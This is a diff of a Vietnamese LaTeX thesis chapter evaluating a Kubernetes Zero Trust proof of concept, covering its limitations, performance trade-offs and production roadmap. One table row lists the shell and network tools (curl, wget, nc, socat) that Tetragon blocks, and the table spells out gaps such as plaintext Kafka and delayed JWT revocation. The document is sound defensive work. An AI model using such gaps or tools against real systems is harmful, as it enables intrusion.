-T7 -- Thu thập thông tin và phản hồi nâng cao security posture & EFK + Prometheus + Hubble; PDP đọc Trivy CVE $\rightarrow$ cập nhật \texttt{score-bucket} $\rightarrow$ Cilium re-enforce & Grafana ``ZTA Active Alerts'' \\
+T7 -- Thu thập \& cải thiện posture & EFK + Prometheus + Hubble; PDP đọc Trivy CVE $\to$ cập nhật score $\to$ Cilium re-enforce; Grafana dashboard & Grafana ``ZTA Active Alerts''; TC-29 đến TC-31 & CT-29,30,31 \\
 \hline
 \end{tabularx}
 \end{table}
 
-\paragraph{Known Limitations.}
-\begin{itemize}
-    \item \textbf{Vault Transit RAM-only}: \texttt{vault-dev} dùng dev mode lưu khoá trong RAM. Pod restart = mất khoá = \texttt{vault-prod} không tự unseal. Đó là lý do nút này pin vào \texttt{7189srv05} (host Ubuntu uptime cao nhất) và có PDB. Production cần chuyển sang Cloud KMS hoặc Raft + PVC.
-    \item \textbf{Kafka plaintext}: PLAINTEXT internal, chưa bật SASL/SSL. Cilium L3/L4 chặn external nhưng không bảo vệ truy cập từ pod của cùng namespace nếu bị chiếm quyền.
-    \item \textbf{Cilium mTLS sidecarless tắt trong baseline}: \texttt{mesh-auth-enabled=false} để tiết kiệm RAM trong ngân sách 15.5\,GiB; SVID của SPIRE đã sẵn sàng, chỉ cần flip flag khi cần.
-    \item \textbf{Alertmanager không triển khai}: thay bằng PrometheusRule + Grafana panel ``ZTA Active Alerts''. Routing tới Slack/PagerDuty là việc của môi trường production.
-    \item \textbf{Tetragon Phase 2 và CAEP chưa khởi động}: chạm \texttt{ptrace}/\texttt{capabilities} và thu hồi phiên người dùng theo sự kiện CAEP mới ở mức thiết kế.
-\end{itemize}
+Kết quả: \textbf{7/7 nguyên lý} của NIST SP 800-207 đều có cơ chế tương ứng đã triển khai, bằng chứng vận hành cụ thể, và ít nhất một test case Behavior (BT) xác nhận hoạt động đúng.
 
-\paragraph{Kết luận xác thực.} 7/7 nguyên lý của NIST SP 800-207 đều có cơ chế tương ứng đã triển khai và bằng chứng vận hành; phần lớn known limitations phụ thuộc bối cảnh PoC (RAM 15.5\,GiB, lần di trú srv04$\to$srv05) chứ không phải thiếu thiết kế.
-
-\section{Thảo luận}
-\label{sec:discussion}
-
-\paragraph{Tính tổng quát.} Khung 5 lớp + pipeline \texttt{zta-rebuild.sh} được thiết kế trên Kind 1-host nhưng đã di trú sang kubeadm 4 VM mà không sửa logic các phase; flag \texttt{ZTA\_CLUSTER\_MODE=external} là điều duy nhất khác biệt. Điều này gợi ý khung có thể bám sang các cụm kubeadm bare-metal hoặc managed (EKS, GKE) với cùng bộ manifest, miễn CNI vẫn là Cilium.
-
-\paragraph{Từ PoC sang production.} Ba thay đổi bắt buộc:
-\begin{enumerate}
-    \item Thay Vault dev Transit bằng Cloud KMS hoặc Raft + PVC; chuyển credential seal qua Vault Operator.
-    \item Bật SASL/SSL cho Kafka; tách physical DB cho mỗi microservice thay vì dùng chung MySQL StatefulSet.
-    \item Bật lại \texttt{mesh-auth-enabled} và \texttt{enable-wireguard} sau khi ngân sách RAM cho phép (~+300\,MiB trên toàn cụm), đồng thời cấu hình Alertmanager routing.
-\end{enumerate}
-
-\section*{Hạn chế và Hướng phát triển tương lai}
-
-Cần nhấn mạnh rằng hệ thống job7189 là một \textbf{Proof of Concept (PoC)}, giải quyết thành công các bài toán cốt lõi của Zero Trust nhưng chưa phải là một giải pháp Zero Trust Enterprise (ZTE) hoàn chỉnh. Nhằm nhận thức rõ độ trưởng thành của hệ thống, Bảng~\ref{tab:limitations} đóng khung các giới hạn hiện tại và định hướng nâng cấp cho môi trường Production.
+% ============================================================
+\section{Known Limitations và Hướng phát triển}
+\label{sec:limitations}
+% ============================================================
 
 \begin{table}[H]
 \centering
-\caption{Giới hạn của hệ thống PoC và Hướng phát triển Enterprise}
+\caption{Giới hạn của hệ thống PoC và hướng phát triển Enterprise}
 \label{tab:limitations}
 \small
 \renewcommand{\arraystretch}{1.3}
-\begin{tabularx}{\textwidth}{|p{3.5cm}|>{\raggedright\arraybackslash}p{4cm}|X|}
+\begin{tabularx}{\textwidth}{|p{3.2cm}|>{\raggedright\arraybackslash}p{4cm}|X|}
 \hline
-\textbf{Thành phần} & \textbf{Trạng thái PoC hiện tại} & \textbf{Hướng phát triển (Future Work)} \\
+\textbf{Thành phần} & \textbf{Trạng thái PoC} & \textbf{Hướng phát triển} \\
 \hline
-\textbf{Runtime Isolation} & Đã triển khai PoC (Tetragon chặn \texttt{/bin/sh}, \texttt{curl}). & Bổ sung AppArmor/Seccomp và mở rộng bộ rule chặn System Call chi tiết hơn. \\
+\textbf{Vault Storage} & Dev mode, khoá lưu trong RAM. Pod restart = mất khoá = cần unseal thủ công. Pin vào \texttt{7189srv05} + PDB để giảm thiểu. & Chuyển sang Cloud KMS (AWS/GCP) hoặc Raft + PVC + Vault Operator auto-unseal. \\
 \hline
-\textbf{Dynamic Trust Enforcement} & Đã triển khai mức Policy Label (Trivy CVE $\rightarrow$ Trust Score $\rightarrow$ Cilium). & Hoàn thiện mô hình tính điểm với AI/ML (Risk Scoring) để nhận diện hành vi bất thường tinh vi hơn. \\
+\textbf{Kafka} & PLAINTEXT nội bộ. Cilium L3/L4 chặn external nhưng pod trong cùng namespace bị chiếm quyền có thể subscribe. & Bật SASL/SSL; cấp x.509 certificate qua SPIRE cho mỗi Kafka client. \\
 \hline
-\textbf{CAEP (Event-driven Revocation)} & Chưa triển khai đầy đủ. & Tích hợp chuẩn CAEP của OpenID; IdP tự động báo PEP thu hồi JWT ngay khi đổi mật khẩu/rò rỉ. \\
+\textbf{CAEP} & Chưa triển khai; JWT bị thu hồi qua Keycloak nhưng Kong vẫn accept đến khi \texttt{exp} hết hạn (max 5 phút). & Tích hợp chuẩn CAEP (OpenID); IdP push event tới Kong để blacklist token tức thì. \\
 \hline
-\textbf{Device Posture} & Ngoài phạm vi đồ án. & Tích hợp giải pháp EDR/MDM tại Client; thiết lập mTLS từ thiết bị của người dùng (Device Binding). \\
+\textbf{Device Posture} & Ngoài phạm vi PoC; Tailscale ACL kiểm soát device nhưng không có EDR/MDM check. & Tích hợp EDR + mTLS Device Binding từ client certificate. \\
 \hline
-\textbf{Multi-cluster Federation} & Triển khai trên cụm đơn (Single Cluster). & Áp dụng Cilium ClusterMesh và SPIRE Federation để giữ nguyên định danh khi giao tiếp xuyên cụm (Multi-cloud). \\
+\textbf{Multi-cluster} & Single cluster. & Cilium ClusterMesh + SPIRE Federation giữ nguyên định danh xuyên cụm. \\
 \hline
-\textbf{Storage cho Vault} & Chạy Dev Mode (RAM-only). & Chuyển sang sử dụng Raft Storage có Persistent Volume hoặc tích hợp Cloud KMS (AWS/GCP) để Auto-unseal. \\
+\textbf{Tetragon Scope} & Chặn 5 binary (shell, curl, wget, nc, socat). Syscall ptrace/capabilities chưa bật. & Mở rộng TracingPolicy sang syscall audit; bổ sung AppArmor/Seccomp profile. \\
+\hline
+\textbf{Risk Scoring} & Rule-based (CVE severity + exec event $\to$ score). & Tích hợp ML behavioral baseline để phát hiện anomaly tinh vi hơn (ví dụ bất thường lưu lượng mạng). \\
 \hline
 \end{tabularx}
 \end{table}
 
-\textbf{Kết luận chung:} Đồ án đã hiện thực hóa thành công các thành phần cốt lõi của kiến trúc Zero Trust (Microsegmentation, Dynamic Secrets, Identity-based access, Adaptive Loop) trên một hệ thống Microservices thực tế. Bảng giới hạn trên chính là bản lề cho các nghiên cứu tiếp theo trên lộ trình chuyển đổi dài hạn, phù hợp với nguyên lý ``triển khai tuần tự và lặp lại'' của NIST SP 800-207.
+% ============================================================
+\section{Thảo luận}
+\label{sec:discussion}
+% ============================================================
+
+\paragraph{Tính tổng quát của khung.} Khung 5 lớp + pipeline \texttt{zta-rebuild.sh} được thiết kế ban đầu trên Kind 1-host nhưng đã di trú thành công sang kubeadm 4 VM mà không sửa logic các phase; flag duy nhất thay đổi là \texttt{ZTA\_CLUSTER\_MODE=external}. Điều này gợi ý khung có thể bám sang các cụm kubeadm bare-metal hoặc managed (EKS, GKE) với cùng bộ manifest, với điều kiện CNI là Cilium.
+
+\paragraph{Đánh đổi bảo mật -- hiệu năng.} Overhead P99 +76\,ms và throughput $-$12.7\% là chi phí cụ thể của ZTA trong ngữ cảnh cụm 7 vCPU. Tuy nhiên, chi phí này phân bố không đều: 48\,ms là mTLS handshake chỉ xảy ra một lần mỗi phiên; với ứng dụng dùng HTTP/2 keepalive (như job7189), per-request overhead thực tế là $\approx$28\,ms (Kong + Cilium L7). Trong ngữ cảnh ứng dụng tuyển dụng không có SLA latency nghiêm ngặt, đây là đánh đổi hợp lý.
+
+\paragraph{Từ PoC sang production.} Ba thay đổi bắt buộc trước khi deployment production:
+\begin{enumerate}
+    \item Thay Vault dev Transit bằng Cloud KMS hoặc Raft + PVC; chuyển credential seal qua Vault Operator.
+    \item Bật SASL/SSL cho Kafka; tách physical DB cho mỗi microservice thay vì dùng chung MySQL StatefulSet.
+    \item Triển khai CAEP để thu hồi JWT tức thì thay vì chờ \texttt{exp}; cấu hình Alertmanager routing tới Slack/PagerDuty.
+\end{enumerate}
+
+\paragraph{Kết luận chương.} Chương này đã kiểm chứng kiến trúc ZTA theo hai trục độc lập với nền tham chiếu thực nghiệm (Baseline vs Enforced). Bốn kịch bản tấn công chứng minh blast radius giảm 84--100\% và không có downtime khi credential rotation. Overhead hiệu năng là 76\,ms P99 và $-$12.7\% throughput --- chấp nhận được trong ngân sách 15.5\,GiB / 7 vCPU. 7/7 nguyên lý NIST SP 800-207 đều có bằng chứng vận hành cụ thể. Các giới hạn còn lại (Vault RAM-only, Kafka plaintext, CAEP) đều có lộ trình nâng cấp rõ ràng và không ảnh hưởng đến tính đúng đắn của mô hình kiến trúc đề xuất.
